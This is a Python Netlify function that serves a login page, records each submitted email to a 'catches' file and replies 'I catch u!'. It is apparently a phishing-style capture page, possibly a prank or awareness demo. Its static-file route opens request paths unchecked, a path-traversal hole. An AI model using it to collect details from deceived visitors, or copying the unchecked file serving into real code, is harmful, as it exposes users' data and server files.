import json
import os

def handler(event, context):
    """Netlify function handler"""
    path = event['path']
    
    if path == '/' or path == '':
        # Ana sayfa için HTML döndür
        try:
            with open('templates/login.html', 'r', encoding='utf-8') as f:
                html_content = f.read()
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': 'text/html'
                },
                'body': html_content
            }
        except Exception as e:
            return {
                'statusCode': 500,
                'body': json.dumps({'error': str(e)})
            }
    
    elif path == '/login':
        # Login endpoint'i için
        try:
            if event['httpMethod'] != 'POST':
                return {'statusCode': 405, 'body': 'Method not allowed'}
            
            # Request body'den email'i al
            body = json.loads(event['body']) if isinstance(event['body'], str) else event['body']
            email = body.get('email')
            
            # Email'i kaydet
            with open('/tmp/catches.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email: {email}\n")
                f.write("-" * 50 + "\n")
            
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': 'application/json'
                },
                'body': json.dumps({"message": "I catch u!"})
            }
        except Exception as e:
            return {
                'statusCode': 500,
                'body': json.dumps({'error': str(e)})
            }
    
    elif path.startswith('/static/'):
        # Statik dosyalar için
        try:
            file_path = path[1:]  # Remove leading slash
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content_type = 'text/css' if path.endswith('.css') else 'image/jpeg' if path.endswith('.jpg') else 'text/plain'
            
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': content_type
                },
                'body': content
            }
        except Exception as e:
            return {
                'statusCode': 404,
                'body': json.dumps({'error': 'File not found'})
            }
    
    return {
        'statusCode': 404,
        'body': 'Not found'
    } 